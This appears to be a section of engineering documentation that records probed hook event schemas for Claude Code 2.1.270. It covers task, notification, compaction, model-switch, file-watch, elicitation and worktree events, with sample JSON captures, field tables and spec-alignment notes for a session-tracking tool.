| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `agent_id` | string | always | | |
| `agent_type` | string | always | `general-purpose`, `shpprobe`, `""` (2/4) | `""` = internal subagent |
| `agent_transcript_path` | string | always | `…/<session_id>/subagents/agent-<agent_id>.jsonl` | |
| `last_assistant_message` | string | sometimes (3/4) | | |
| `stop_hook_active` / `background_tasks` / `session_crons` | | always | as Stop | |

**Variants and edge cases:** internal subagents emit **SubagentStop without SubagentStart**: compaction (`docs/probes/2026-09-14-schemas/hooks/live/S05_compact`, `agent_type:""`, `last_assistant_message` = the compaction analysis) and a post-turn agent 7.5 s after Stop in the TUI (`docs/probes/2026-09-14-schemas/hooks/live/I01_interactive`, 15:38:46.760).

**Spec alignment:**
- spec line 885 (`active_subagents` from `SubagentStart`/`SubagentStop`): a naive +1/−1 counter goes negative — 2 of 4 SubagentStop captures had no matching SubagentStart (`docs/probes/2026-09-14-schemas/hooks/live/S05_compact/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/I01_interactive/events.jsonl`). Count by `agent_id` pairing and ignore `agent_type:""`.

---

### TaskCreated / TaskCompleted

- **Produced by:** Claude Code 2.1.270 (zod `Gle` / `Vle`)
- **Consumed by:** §8 line 884 and heuristic 1 (open task ledger); §7 `tasks_done`/`tasks_total` (line 678); §18 line 2330; M1, M2
- **Probe:** `run_probes.py S01 S18`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S18`
- **Status:** partially verified — `task_id`, `task_subject`, `task_description` live 2026-09-14; optional `teammate_name`/`team_name` (agent teams) never observed. Audit: downgraded from "verified"

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","hook_event_name":"TaskCreated","task_id":"1","task_subject":"probe task","task_description":"Probe task for testing hooks"}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","hook_event_name":"TaskCompleted","task_id":"1","task_subject":"probe task","task_description":"Probe task for testing hooks"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `task_id` | string | always | `"1"`, `"2"` | small per-session counter, not a UUID |
| `task_subject` | string | always | `probe task`, `alpha`, `beta` | |
| `task_description` | string | always | | optional in schema |
| `teammate_name` / `team_name` | string | never observed | — | agent teams only |
| `permission_mode` | — | never | — | |

**Variants and edge cases:**
- `TaskCompleted` fires inside the `TaskUpdate{status:"completed"}` tool call, between its PreToolUse and PostToolUse.
- S18 created 2, completed 1, then stopped: the ledger shows 1 open task at `Stop` (heuristic 1 input available).
- Task deletion/other statuses not probed.

**Spec alignment:** aligned (spec line 884; line 2330 "documented, not observed" is now observed).

---

### Notification

- **Produced by:** Claude Code 2.1.270 (zod `wle`; dispatcher `ZT()`, matcher = `notification_type`, `docs/probes/2026-09-14-schemas/hooks/binary/enums.json`)
- **Consumed by:** §8 line 883, 917, 937, 945 (`needs_you`), line 957 (`quota_paused`); §7 `needs_you_reason` (line 677); §18 line 2330; M1, M2
- **Probe:** `docs/probes/2026-09-14-schemas/hooks/interactive_probe.py` (TUI) + `run_probes.py S17` (`-p`). Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`
- **Status:** partially verified — `permission_prompt`, `idle_prompt` (TUI) and `elicitation_response` (`-p`) live; other types binary only

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/I01_interactive/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S17_elicitation/events.jsonl`)

```json
{"session_id":"1dda4143-3fdf-40ef-b167-252c1abd1e15","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15.jsonl","cwd":"/tmp/shp-hooks-tui-1tlg88mq","scratchpad_dir":"/tmp/claude-0/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15/scratchpad","prompt_id":"190ccd82-3a5c-48e4-b9e2-3d288b7fbd37","hook_event_name":"Notification","message":"Claude needs your permission","notification_type":"permission_prompt"}
{"session_id":"1dda4143-3fdf-40ef-b167-252c1abd1e15","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15.jsonl","cwd":"/tmp/shp-hooks-tui-1tlg88mq","scratchpad_dir":"/tmp/claude-0/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15/scratchpad","prompt_id":"5509caee-21b7-463a-9276-d8ae39794110","hook_event_name":"Notification","message":"Claude is waiting for your input","notification_type":"idle_prompt"}
{"session_id":"d7624398-e34c-412b-aef6-07060eef081c","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-elicit-zg1uunox/d7624398-e34c-412b-aef6-07060eef081c.jsonl","cwd":"/tmp/shp-hooks-elicit-zg1uunox","prompt_id":"d5b1bc68-9ff2-495b-b0f8-3a88b3994f0c","hook_event_name":"Notification","message":"Elicitation response for server \"shpelicit\": cancel","notification_type":"elicitation_response"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `message` | string | always | `Claude needs your permission`, `Claude is waiting for your input`, `Elicitation response for server "shpelicit": cancel` | |
| `notification_type` | string | always | `permission_prompt`, `idle_prompt`, `elicitation_response` | schema types it as free string |
| `title` | string | never observed | — | optional |
| `permission_mode` | — | never | — | |

**Variants and edge cases:**
- `permission_prompt` arrived 6.0 s after `PermissionRequest` (I01).
- `idle_prompt` arrived 60.0 s after the turn's `Stop` (15:38:39.241 → 15:39:39.272) with no keystroke in between. The binary's idle timer (class `wee`) only sends it when no user interaction happened after the last completed query and no dialog is on screen; sender in `docs/probes/2026-09-14-schemas/hooks/binary/runtime-source-snippets.txt` line 25.
- `-p` does emit Notification for MCP elicitation (`elicitation_response`), but never `permission_prompt`/`idle_prompt` (no prompt UI).

**Spec alignment:**
- spec line 937 value set: `permission_prompt` and `idle_prompt` verified (TUI only). `agent_needs_input`, `elicitation_dialog` and `elicitation_url_dialog` are in the binary list `VAr` but were not observed. Other real values: `elicitation_response` (observed), `auth_success`, `elicitation_complete`, `agent_completed`, `worker_permission_prompt`, `push_notification`, `computer_use_enter`, `computer_use_exit`. Audit: line 937 names only the needs-you subset, so leaving out non-blocking types (`auth_success`, `agent_completed`, `elicitation_response`, …) is not a mismatch. `worker_permission_prompt` is the one unlisted value that may be a needs-you ask; its meaning was not probed.
- spec line 957 (`quota_auto_resume_fired|stale|disabled`): present in `VAr`, not provoked (needs a real quota exhaustion).
- spec line 883 (Notification → `needs_you`): headless (`owned` `-p`) sessions never emit `permission_prompt`/`idle_prompt`; for them `needs_you` can only come from `PermissionRequest`.

---

### MessageDisplay

- **Produced by:** Claude Code 2.1.270 (zod `nce`; dispatched with `forceSyncExecution:!0`)
- **Consumed by:** §8 line 916 (liveness); M1
- **Probe:** `run_probes.py S01` + `docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01`
- **Status:** partially verified — all fields live 2026-09-14 (51 captures), but only `index:0`, `final:true`; multi-chunk messages (`index>0`, `final:false`) are not in any retained capture. Audit: downgraded from "verified"

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","hook_event_name":"MessageDisplay","turn_id":"ea71826b-de48-41a0-8473-f4901639f66e","message_id":"1accf04d-c666-45f6-91d2-e334ba34b521","index":0,"final":true,"delta":"FINISHED"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `turn_id` | string (UUID) | always | | |
| `message_id` | string (UUID) | always | | "Not the API msg_… id" (schema) |
| `index` | int | always | `0` in all retained captures | schema: chunk index within one `message_id`; multi-chunk flushes not retained |
| `final` | bool | always | `true` in all retained captures | |
| `delta` | string | always | the displayed text chunk | |
| `permission_mode` | — | never | — | |

**Variants and edge cases:** fired even for synthetic error messages (the model-not-found text in S07); one MessageDisplay per displayed assistant message in `-p`.

**Spec alignment:** aligned (liveness only). Volume note for §18 line 2327: MessageDisplay is synchronous (`forceSyncExecution`), so a slow hook delays display.

---

### PreCompact / PostCompact

- **Produced by:** Claude Code 2.1.270 (zod `Lle` / `Ule`)
- **Consumed by:** §8 line 921; `context_exhausted` rule (line 966); M2
- **Probe:** `run_probes.py S05` (manual) and `S22` (auto attempt). Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S05 S22`
- **Status:** partially verified — `trigger:"manual"` live; `trigger:"auto"` binary only

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S05_compact/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"4cd9a4b3-3847-487a-bdad-6d2317fe2948","hook_event_name":"PreCompact","trigger":"manual","custom_instructions":null}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"4cd9a4b3-3847-487a-bdad-6d2317fe2948","hook_event_name":"PostCompact","trigger":"manual","compact_summary":"<analysis>\nThe conversation consists of a single, structured request from the user to execute a specific sequ..."}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `trigger` | enum | always | `manual` | binary `["manual","auto"]` |
| `custom_instructions` | string or null | always (Pre) | `null` | |
| `compact_summary` | string | always (Post) | the summary text | |
| `permission_mode` | — | never | — | |

**Variants and edge cases:** `/compact` sent as the `-p` prompt works; sequence Pre → internal SubagentStop → SessionStart{compact} → Post (14.7 s). Auto-compaction not provoked: S22 made the mock API report `input_tokens: 195000` on the first call; the second request went out with no compaction (`docs/probes/2026-09-14-schemas/hooks/live/S22_mock_autocompact/mock-requests.jsonl`; `docs/probes/2026-09-14-schemas/hooks/live/S22_mock_autocompact/debug-extras.txt`: `turn 1 end (turns=2 usage in=195050 …)`), and a second streamed user message was folded into the same turn.

**Spec alignment:** spec line 966 `PreCompact{auto}`: field is `trigger`, value `auto` is in the enum; not observed live.

---

### PreModelSwitch / PostModelSwitch

- **Produced by:** Claude Code 2.1.270 (zod `Fle` / `Ble` + `Qz`)
- **Consumed by:** §8 line 922 (identity); §7 `model` column; M1
- **Probe:** `run_probes.py S14`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S14`
- **Status:** partially verified — `source:"command"` live; `picker`, `sdk`, `auto`, `resume` binary only

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S14_model_switch/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"a7f810bc-7d70-4676-9a0b-aea4535f716f","hook_event_name":"PreModelSwitch","from_model":"claude-haiku-4-5-20251001","to_model":"claude-sonnet-5","requested_model":"sonnet","source":"command","context_tokens":1844,"prompt_cache_warm":false,"cache_ttl":"1h","estimated_cache_write_usd":0.0074,"pricing":"catalog"}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"a7f810bc-7d70-4676-9a0b-aea4535f716f","hook_event_name":"PostModelSwitch","from_model":"claude-haiku-4-5-20251001","to_model":"claude-sonnet-5","requested_model":"sonnet","source":"command","context_tokens":1844,"prompt_cache_warm":false,"cache_ttl":"1h","estimated_cache_write_usd":0.0074,"pricing":"catalog"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `from_model` / `to_model` | string | always | `claude-haiku-4-5-20251001` → `claude-sonnet-5` | resolved ids |
| `requested_model` | string or null | always | `sonnet` | the alias typed |
| `source` | enum | always | `command` | Pre: `command,picker,sdk`; Post adds `auto,resume` |
| `context_tokens` | int | always | `1844` | |
| `prompt_cache_warm` | bool | always | `false` | |
| `cache_ttl` | enum | always | `1h` | `5m`/`1h` |
| `estimated_cache_write_usd` | number | always | `0.0074` | |
| `pricing` | enum | always | `catalog` | `configured/catalog/default` |

**Variants and edge cases:** `--resume` with a different `--model` emitted **no** model-switch event (`docs/probes/2026-09-14-schemas/hooks/live/S14b_resume_other_model/events.jsonl`).

**Spec alignment:** aligned (names only in spec).

---

### InstructionsLoaded

- **Produced by:** Claude Code 2.1.270 (zod `Xle`)
- **Consumed by:** not consumed by the spec
- **Probe:** `run_probes.py S01 S03 S12`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S12`
- **Status:** partially verified — `load_reason:"session_start"`, `memory_type:"Project"` live; other values binary only

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S03_continue/events.jsonl`)

```json
{"session_id":"437540c8-e30c-492c-ad1b-201b3b5f586f","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/437540c8-e30c-492c-ad1b-201b3b5f586f.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","hook_event_name":"InstructionsLoaded","file_path":"/tmp/shp-hooks-base-dwqg6d95/CLAUDE.md","memory_type":"Project","load_reason":"session_start"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `file_path` | string | always | `<cwd>/CLAUDE.md` | |
| `memory_type` | enum | always | `Project` | `User/Project/Local/Managed` |
| `load_reason` | enum | always | `session_start` | `session_start/nested_traversal/path_glob_match/include/compact` |
| `globs` / `trigger_file_path` / `parent_file_path` | | never observed | — | |

**Variants and edge cases:** fires before SessionStart; on `--continue` it carried a provisional `session_id` different from the resumed one (example above vs `SessionStart` `8bbcceab…` in the same file).

**Spec alignment:** aligned (not referenced).

---

### ConfigChange

- **Produced by:** Claude Code 2.1.270 (zod `$le`)
- **Consumed by:** not consumed by the spec; relevant to §15 (Shepherd editing `~/.claude/settings.json` under running sessions)
- **Probe:** `run_probes.py S21`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S21`
- **Status:** partially verified — `source:"local_settings"` live; other sources binary only

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S21_config_change/events.jsonl`)

```json
{"session_id":"ca162c8a-8d5d-48ea-9f1f-bdfcb268cf01","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-config-33ijfqat/ca162c8a-8d5d-48ea-9f1f-bdfcb268cf01.jsonl","cwd":"/tmp/shp-hooks-config-33ijfqat","prompt_id":"3f733a88-ae47-495e-996f-eed94453ae1d","hook_event_name":"ConfigChange","source":"local_settings","file_path":"/tmp/shp-hooks-config-33ijfqat/.claude/settings.local.json"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `source` | enum | always | `local_settings` | `user_settings/project_settings/local_settings/policy_settings/skills` |
| `file_path` | string | always | `<cwd>/.claude/settings.local.json` | optional in schema |

**Variants and edge cases:** triggered by an outside process rewriting the file mid-session. A Bash write to a `.claude/settings.local.json` path by the model raised a PermissionRequest even with `--allowedTools Bash` (`docs/probes/2026-09-14-schemas/hooks/live/S13_watch_cwd_config/events.jsonl`).

**Spec alignment:** aligned (not referenced). Implication for §15: a running session observes Shepherd's install/uninstall edits live (debug `Watching for changes in setting files /root/.claude/settings.json, …`).

---

### CwdChanged

- **Produced by:** Claude Code 2.1.270 (zod `Zle`)
- **Consumed by:** §8 line 922 (identity); D22 (cwd → repo binding); M1
- **Probe:** `run_probes.py S13`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S13`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S13_watch_cwd_config/events.jsonl`)

```json
{"session_id":"a52f91c4-4b46-49b1-9d95-c0c52b8a28af","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-watch-jnn4-1pq/a52f91c4-4b46-49b1-9d95-c0c52b8a28af.jsonl","cwd":"/tmp/shp-hooks-watch-jnn4_1pq/sub","prompt_id":"5c654ba4-f0b2-415a-baf9-1cacbcf1b5dc","hook_event_name":"CwdChanged","old_cwd":"/tmp/shp-hooks-watch-jnn4_1pq","new_cwd":"/tmp/shp-hooks-watch-jnn4_1pq/sub"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `old_cwd` / `new_cwd` | string | always | `/tmp/shp-hooks-watch-jnn4_1pq` → `…/sub` | |

**Variants and edge cases:** the common `cwd` already shows the new directory on this event (and on the PostToolUse of the `cd` call). The Bash cwd persists: the next `pwd` call printed `…/sub` and emitted no further CwdChanged.

**Spec alignment:** aligned.

---

### FileChanged

- **Produced by:** Claude Code 2.1.270 (zod `ece`)
- **Consumed by:** §8 line 886 and line 923 (`repos_touched`); §7 line 680; D22; §18 line 2330; M1
- **Probe:** `run_probes.py S13 S21` (+ negative control S09 acceptEdits Write). Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S13 S21`
- **Status:** partially verified — `event:"change"` and `"unlink"` live 2026-09-14 for hook-returned `watchPaths`. `event:"add"` was never observed. Watch paths declared through the `FileChanged` matcher come from the binary only. Audit: downgraded from "verified"

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S13_watch_cwd_config/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S21_config_change/events.jsonl`)

```json
{"session_id":"a52f91c4-4b46-49b1-9d95-c0c52b8a28af","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-watch-jnn4-1pq/a52f91c4-4b46-49b1-9d95-c0c52b8a28af.jsonl","cwd":"/tmp/shp-hooks-watch-jnn4_1pq","prompt_id":"5c654ba4-f0b2-415a-baf9-1cacbcf1b5dc","hook_event_name":"FileChanged","file_path":"/tmp/shp-hooks-watch-jnn4_1pq/watched.txt","event":"change"}
{"session_id":"ca162c8a-8d5d-48ea-9f1f-bdfcb268cf01","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-config-33ijfqat/ca162c8a-8d5d-48ea-9f1f-bdfcb268cf01.jsonl","cwd":"/tmp/shp-hooks-config-33ijfqat","prompt_id":"3f733a88-ae47-495e-996f-eed94453ae1d","hook_event_name":"FileChanged","file_path":"/tmp/shp-hooks-config-33ijfqat/watched.txt","event":"unlink"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `file_path` | string | always | the watched path | |
| `event` | enum | always | `change`, `unlink` | binary `change/add/unlink`; the re-create in S21 did not emit `add` before exit |

**Variants and edge cases:** FileChanged fires **only for paths a hook registered** via `hookSpecificOutput.watchPaths` (SessionStart/CwdChanged/FileChanged output). S13 debug: `Hook SessionStart (…emit_watchpaths.sh) provided 1 watchPaths` then `FileChanged: change …/watched.txt`. Claude's own `Write` of `./inside.txt` in `acceptEdits` produced no FileChanged (`docs/probes/2026-09-14-schemas/hooks/live/S09_perm_acceptEdits_write_inside/events.jsonl`).
- Audit (binary only, not live): the watcher also takes paths from the settings `FileChanged` groups' `matcher`. Each matcher is split on `|`, relative names are resolved against the cwd, and the result is merged with hook-returned `watchPaths` (`for(let De of Pe){if(!De.matcher)continue;for(let We of De.matcher.split("|")…`, near byte offset 192424700 of `/root/.local/share/claude/versions/2.1.270`; debug `FileChanged: watching N paths`). So "only hook-declared `watchPaths`" is incomplete: literal file names in the matcher are watched too. Every probe used `matcher:"*"`, which names no real file.

**Spec alignment:**
- spec lines 680 and 886 say `repos_touched` accumulates from `FileChanged`; reality: FileChanged does not report files the agent edits. It reports only declared watch paths: hook-returned `watchPaths` (live: S13, S21; negative control S09), plus `FileChanged` matcher file names (binary only, see above). `repos_touched` needs PostToolUse `tool_input.file_path` (Edit/Write) and Bash cwd, or a watch list Shepherd returns from a SessionStart hook.

---

### DirectoryAdded

- **Produced by:** Claude Code 2.1.270 (zod `tce`)
- **Consumed by:** not consumed by the spec; relevant to D22 (multi-repo sessions)
- **Probe:** `docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`
- **Status:** partially verified — TUI `/add-dir` (`source:"slash_command"`) live; `register_repo_root` binary only

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/I01_interactive/events.jsonl`)

```json
{"session_id":"1dda4143-3fdf-40ef-b167-252c1abd1e15","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15.jsonl","cwd":"/tmp/shp-hooks-tui-1tlg88mq","scratchpad_dir":"/tmp/claude-0/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15/scratchpad","prompt_id":"cfa5fa22-e087-4fa8-ba98-df48e4975351","hook_event_name":"DirectoryAdded","directory":"/tmp/shp-hooks-tui-extra-ye47wasb","source":"slash_command"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `directory` | string | always | the added dir | |
| `source` | enum | always | `slash_command` | binary `slash_command/register_repo_root` |

**Variants and edge cases:** `--add-dir` at launch was not tested for this event.

**Spec alignment:** aligned (not referenced).

---

### Elicitation / ElicitationResult

- **Produced by:** Claude Code 2.1.270 (zod `Kle` / `jle`)
- **Consumed by:** §8 line 917 (needs-you); M1
- **Probe:** `run_probes.py S17` with the stdio MCP server `docs/probes/2026-09-14-schemas/hooks/mcp_elicit.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S17`
- **Status:** partially verified — `form` mode with `-p` auto-cancel live; `url` mode and `accept`/`decline` binary only

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S17_elicitation/events.jsonl`; MCP wire log `docs/probes/2026-09-14-schemas/hooks/live/S17_elicitation/mcp-messages.jsonl`)

```json
{"session_id":"d7624398-e34c-412b-aef6-07060eef081c","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-elicit-zg1uunox/d7624398-e34c-412b-aef6-07060eef081c.jsonl","cwd":"/tmp/shp-hooks-elicit-zg1uunox","prompt_id":"d5b1bc68-9ff2-495b-b0f8-3a88b3994f0c","hook_event_name":"Elicitation","mcp_server_name":"shpelicit","message":"What name should the probe use?","mode":"form","requested_schema":{"type":"object","properties":{"name":{"type":"string"}},"required":["name"]}}
{"session_id":"d7624398-e34c-412b-aef6-07060eef081c","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-elicit-zg1uunox/d7624398-e34c-412b-aef6-07060eef081c.jsonl","cwd":"/tmp/shp-hooks-elicit-zg1uunox","prompt_id":"d5b1bc68-9ff2-495b-b0f8-3a88b3994f0c","hook_event_name":"ElicitationResult","mcp_server_name":"shpelicit","mode":"form","action":"cancel"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `mcp_server_name` | string | always | `shpelicit` | matcher value |
| `message` | string | always (Elicitation) | | |
| `mode` | enum | always | `form` | `form/url` |
| `requested_schema` | object | always (Elicitation) | | |
| `url`, `elicitation_id` | string | never observed | — | url mode |
| `action` | enum | always (Result) | `cancel` | `accept/decline/cancel` |
| `content` | object | never observed | — | |

**Variants and edge cases:** in `-p` the client answered `{"action":"cancel"}` within 10 ms and then emitted `Notification{elicitation_response}`; the session never blocked.

**Spec alignment:** spec line 917 treats Elicitation as needs-you; in `-p` it is auto-cancelled immediately, so it is not a blocking state there.

---

### Setup

- **Produced by:** Claude Code 2.1.270 (zod `Mle`)
- **Consumed by:** not consumed by the spec
- **Probe:** `run_probes.py S16`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S16`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S16_setup__maintenance/events.jsonl`)

```json
{"session_id":"8579b64c-02b2-4e71-83ab-272017f810a3","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-setup-5053kbfl/8579b64c-02b2-4e71-83ab-272017f810a3.jsonl","cwd":"/tmp/shp-hooks-setup-5053kbfl","hook_event_name":"Setup","trigger":"maintenance"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `trigger` | enum | always | `init` (`--init`, `--init-only`), `maintenance` (`--maintenance`) | fires before SessionStart |

**Variants and edge cases:** `--init-only` exits after Setup/SessionStart/SessionEnd without a prompt.

**Spec alignment:** aligned (not referenced).

---

### WorktreeCreate / WorktreeRemove

- **Produced by:** Claude Code 2.1.270 (zod `Jle` / `Qle`)
- **Consumed by:** not consumed by the spec; relevant to D15 (worker worktrees)
- **Probe:** `run_probes.py S15`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S15`
- **Status:** partially verified — WorktreeCreate live; WorktreeRemove binary only

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S15_worktree/events.jsonl`)

```json
{"session_id":"2078d6fd-468c-456d-bbcd-1000d6ba4eeb","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-wt-uccy58xp/2078d6fd-468c-456d-bbcd-1000d6ba4eeb.jsonl","cwd":"/tmp/shp-hooks-wt-uccy58xp","hook_event_name":"WorktreeCreate","name":"shpwt"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `name` | string | always | `shpwt` (from `--worktree shpwt`) | |
| `worktree_path` | string | (WorktreeRemove) not observed | — | |

**Variants and edge cases:** **registering any WorktreeCreate command hook replaces git worktree creation**: the capture hook printed nothing and the launch failed with `Error creating worktree: WorktreeCreate hook failed: hook succeeded but returned no worktree path` (`docs/probes/2026-09-14-schemas/hooks/live/S15_worktree/stderr.txt`, exit 1). A catch-all "subscribe to every event" dispatcher must not register WorktreeCreate.

**Spec alignment:** aligned (not referenced). Audit: the heading on §8 line 893 says "one dispatcher, all events", but the text says `hookd.py` is registered for "every event we need" (lines 895–896), and the subscribed list (lines 912–923) leaves out WorktreeCreate. So the spec does not register it; the claimed misalignment is refuted. Caution for implementers: never add WorktreeCreate to a catch-all install, because that breaks `--worktree` (S15).

---

### TeammateIdle

- **Produced by:** Claude Code 2.1.270 (zod `Hle`)
- **Consumed by:** not consumed by the spec
- **Probe:** `docs/probes/2026-09-14-schemas/hooks/extract_binary.py` → `docs/probes/2026-09-14-schemas/hooks/binary/hook-input-schemas.txt`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/extract_binary.py`
- **Status:** not verifiable here — requires the agent-teams feature; not attempted

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/binary/hook-input-schemas.txt`)

```text
Hle=f(()=>we().and(u({hook_event_name:R("TeammateIdle"),teammate_name:o(),team_name:o()
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `teammate_name` | string | not observed | — | schema |
| `team_name` | string | not observed | — | schema |

**Variants and edge cases:** none observed.

**Spec alignment:** aligned (not referenced).

---

### Enumerations (SessionStart.source, SessionEnd.reason, StopFailure.error, Notification.notification_type)

- **Produced by:** Claude Code 2.1.270 (`docs/probes/2026-09-14-schemas/hooks/binary/enums.json`; error assignment counts `docs/probes/2026-09-14-schemas/hooks/binary/stopfailure-error-assignments.txt`)
- **Consumed by:** §8 lines 937, 951–971, 1205; D21; M2
- **Probe:** `docs/probes/2026-09-14-schemas/hooks/extract_binary.py` + `run_probes.py S04 S05 S06 S07 S08` + `docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/extract_binary.py && python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S07 S08`
- **Status:** partially verified (per value below)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/binary/enum-sources.txt`)

```text
o_=f(()=>V(["authentication_failed","oauth_org_not_allowed","account_on_hold","verification_required","billing_error","rate_limit","overloaded","invalid_request","model_not_found","server_error","unknown","max_output_tokens","cloud_credential_error"]))
rce=["clear","resume","logout","prompt_input_exit","other"]
R("SessionStart"),source:V(["startup","resume","clear","compact","fork"])
VAr=["permission_prompt","idle_prompt","auth_success","elicitation_dialog","agent_needs_input","agent_completed","elicitation_url_dialog","worker_permission_prompt","push_notification","computer_use_enter","computer_use_exit","quota_auto_resume_fired","quota_auto_resume_stale","quota_auto_resume_disabled"]
```

